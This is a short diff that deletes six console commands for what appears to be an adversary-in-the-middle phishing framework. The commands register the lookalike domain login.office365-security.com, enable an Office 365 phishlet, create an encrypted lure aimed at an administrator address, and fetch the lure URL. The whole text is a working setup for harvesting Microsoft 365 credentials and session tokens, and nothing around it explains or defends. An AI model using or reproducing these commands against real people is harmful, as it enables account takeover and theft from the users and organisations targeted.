@@ -1,6 +1,0 @@
-config domain login.office365-security.com
-phishlets hostname login login.office365-security.com
-phishlets enable office365
-lures create office365 username="admin@target.com" --encrypted
-lures get-url 0
-phishlets list
